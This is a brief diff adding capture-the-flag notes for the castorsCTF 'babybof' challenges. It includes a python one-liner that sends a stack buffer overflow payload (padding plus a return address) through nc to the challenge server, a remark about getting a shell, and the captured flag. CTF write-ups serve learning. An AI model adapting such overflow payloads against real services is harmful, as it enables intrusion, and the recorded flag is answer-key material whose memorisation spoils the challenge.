@@ -1,0 +1,8 @@
+same bin as babybof1 -> must get a shell
+
+for babybof1:
+python -c 'print "A"*264 + "\xe7\x06\x40" + "\x00"*5' | nc chals20.cybercastors.com 14425
+
+use script
+
+castorsCTF{w0w_U_jU5t_h4ck3d_th15!!1_c4ll_th3_c0p5!11}
